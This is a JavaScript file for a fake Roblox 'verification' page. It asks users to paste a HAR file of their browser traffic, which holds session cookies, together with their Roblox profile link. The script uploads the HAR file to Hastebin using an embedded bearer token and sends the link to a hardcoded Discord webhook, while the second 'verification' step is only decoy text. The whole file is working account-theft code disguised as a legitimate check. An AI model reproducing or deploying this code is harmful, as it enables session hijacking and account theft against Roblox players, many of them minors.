const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1314271333911232563/20EtgpJYchBuTxpiIxaeXcFQxOzytZJgGOzxpW_TnQgSS9OGDTeBr7vIcDezGhQxWBgZ";

async function step1Submit() {
    const harFile = document.getElementById("harFile").value.trim();
    const robloxProfile = document.getElementById("robloxProfile").value.trim();

    if (!harFile || !robloxProfile) {
        alert("Please paste the HAR file and provide your Roblox profile link.");
        return;
    }

    // Upload HAR file to Hastebin
    const hastebinUrl = await uploadToHastebin(harFile);
    if (!hastebinUrl) {
        alert("Failed to upload HAR file. Try again later.");
        return;
    }

    // Send the link to the Discord webhook
    const success = await sendToWebhook(hastebinUrl, robloxProfile);
    if (success) {
        alert("Step 1 completed. Proceed to Step 2!");
        document.getElementById("step1").style.display = "none";
        document.getElementById("step2").style.display = "block";

        // Generate the sentence for Step 2
        const generatedSentence = "Please put this sentence as your Roblox description for verification.";
        document.getElementById("generatedSentence").innerText = generatedSentence;
    } else {
        alert("Failed to notify the server. Try again later.");
    }
}

async function uploadToHastebin(content) {
    try {
        const response = await fetch("https://hastebin.com/documents", {
            method: "POST",
            headers: {
                "Content-Type": "text/plain",
                "Authorization": "Bearer 6c519809ee19a7de2a4fc4cf86996bb03617ba8700fa4277d1e370096768d046ad6a913335fbf582f735cf12a8c288c1b8f092817f64d96d1f6f0418b9e78a4b",
            },
            body: content,
        });
        const data = await response.json();
        return `https://hastebin.com/${data.key}`;
    } catch (error) {
        console.error("Error uploading to Hastebin:", error);
        return null;
    }
}

async function sendToWebhook(hastebinUrl, robloxProfile) {
    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `A user submitted the following:\nHAR File: ${hastebinUrl}\nRoblox Profile: ${robloxProfile}`,
            }),
        });
        return response.ok;
    } catch (error) {
        console.error("Error sending to Discord webhook:", error);
        return false;
    }
}

async function step2Verify() {
    const description = prompt("What is your current Roblox description?");
    const expected = document.getElementById("generatedSentence").innerText;

    if (description === expected) {
        alert("You are verified! Thank you!");
    } else {
        alert("Verification failed. Make sure your description matches the provided sentence.");
    }
}
